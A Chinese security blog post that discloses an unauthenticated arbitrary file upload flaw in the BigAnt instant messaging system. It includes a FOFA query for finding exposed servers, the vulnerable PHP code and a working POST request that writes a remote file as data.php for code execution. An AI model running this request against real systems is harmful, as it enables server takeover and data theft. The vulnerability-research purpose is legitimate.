---
title: "大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞"
source: https://mrxn.net/jswz/bigant-dispersedOrg-upload_file-rce.html
asset_dir: assets/大蚂蚁-(bigant)-即时通讯系统-dispersedorgcontroller-任意文件上传漏洞
---

# 大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/2/23 13:04
* 337浏览
* [0评论](#comment)
* 24分钟阅读

深入探索

安全研究报告

文件大小转换

身份验证


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

杭州九麒科技大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 DispersedOrgController upload\_file 接口存在目录遍历+任意文件写入/[上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，攻击者可以通过上传特制的 PHP 文件，执行恶意代码，实现服务器的远程控制，可能导致敏感信息泄露、数据篡改等危害。

漏洞修复方案

# 影响版本

BigAnt 5.5.x 及以上版本用户

[![大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞](images/img-001-af66cd8e6523.webp)](https://image.mrxn.net/5623d2945cc347a388c16efc24905efc.webp)

经过测试，最新版本 6.0.1.20250407.1 也受影响

深入探索

VPN服务

网络安全会议

安全运维咨询

# fofa语法

> (body="/Public/static/admin/admin\_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"

# 漏洞分析

直接看下 Application/Api/Controller/DispersedOrgController.class.php 的实现逻辑

[![大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞](images/img-002-f783ce0eeb2d.webp)](https://image.mrxn.net/9c7753b630f84c1e9ab85615243dea1e.webp)

先看下 `_initialize` 方法有没有鉴权，可以未授权访问，但是需要提供`server_id`

深入探索

企业安全咨询

JSON处理工具

漏洞预警服务

再看 `upload_file()` 方法的实现逻辑

```
public function upload_file(){
    $filePath = I("path");
    $group_id = I("group_id"); //如果带了group_id 说明是群头像更新
       $file_url = I("file_url"); //跨域间传输文件,因为环境导致需要以下载的形式传输

    if(!$filePath){
       Jump::errror("path 错误");
    }
    if(strpos($filePath,"data")===false){
       Jump::errror("path illegal");
    }
    $absolutePath = SITE_PATH."/".$filePath;
    LogWrite("获取上传文件的绝对路径:".$absolutePath);
    $dirname     = dirname($absolutePath);
    if(!is_dir($dirname)){
       if(!mkdir($dirname, 0777, true) && !is_dir($dirname)){
          Jump::errror(301,sprintf('Directory "%s" was not created', $dirname));
       }
    }
    if(is_file($absolutePath)){
       Jump::success("文件已经存在,无需上传");
    }

       $res = sp_download_img($file_url,$absolutePath);      //编译版本的php因为环境差异导致传入文件数组502,采用下载方式传输头像
       if($res===false){
           Jump::errror("头像上传失败");
       }
    //同步群消息
    if($group_id){
       \Common\Model\GroupModel::DD()->where(['group_id'=>$group_id])->save(['group_photo'=>$filePath]);
    }

    Jump::success("上传文件成功");
}
```

文件还是直接上传后保存，且保存路径由用户可控参数`path`==>`$filePath`==>`$absolutePath = SITE_PATH."/".$filePath` 为文件保存路径、文件名、类型以及后缀等，`file_url`参数为远程文件地址，

只需要满足`path`参数包含字符串`data` 即可通过如下校验部分

```
if(strpos($filePath,"data")===false){
    Jump::errror("path illegal");
}
```

`$absolutePath`被带入`$res = sp_download_img($file_url,$absolutePath);`方法，跟进看下它的实现逻辑

[![大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞](images/img-003-bf4125b179cf.webp)](https://image.mrxn.net/c6bd552c96c94780908a7c9f8ecad274.webp)

就是常规的使用curl进行文件下载保存，至此这个目录遍历+任意文件、内容写入/上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)就清晰明了。

# 漏洞复现

> 需要注意thinkphp的路由特性，不区分大小写，且还支持如下等方式
>
> 漏洞修复方案
>
> /api/dispersedOrg/upload\_file.html
>
> /api/dispersedOrg/upload\_file

[![大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞](images/img-004-e4b0608094c7.webp)](https://image.mrxn.net/25a37ebef700452382b881471350c6d8.webp)

```
POST /?m=api&c=dispersedOrg&a=upload_file HTTP/1.1
Host: bigant.mrxn.net
Content-Type: application/x-www-form-urlencoded

path=data.php&file_url=http://127.0.0.1:8001/data.txt&server_id=1
```

访问上传文件 data.php

[![大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞](images/img-005-6460e5c31baa.webp)](https://image.mrxn.net/35e2f7d6e23945dd816f6a734b566cfc.webp)

成功[执行](https://mrxn.net/tag/rce)我们上传的文件，并删除自身

[![大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞](images/img-006-2bb7b534ceb3.webp)](https://image.mrxn.net/9f2fb4bf02fb4d3f8d9d9c403d19b28a.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[大蚂蚁 (BigAnt) 即时通讯系统 DispersedOrgController 任意文件上传漏洞](https://mrxn.net/jswz/bigant-dispersedOrg-upload_file-rce.html)  
文章链接：<https://mrxn.net/jswz/bigant-dispersedOrg-upload_file-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/bigant-dispersedOrg-upload\_file-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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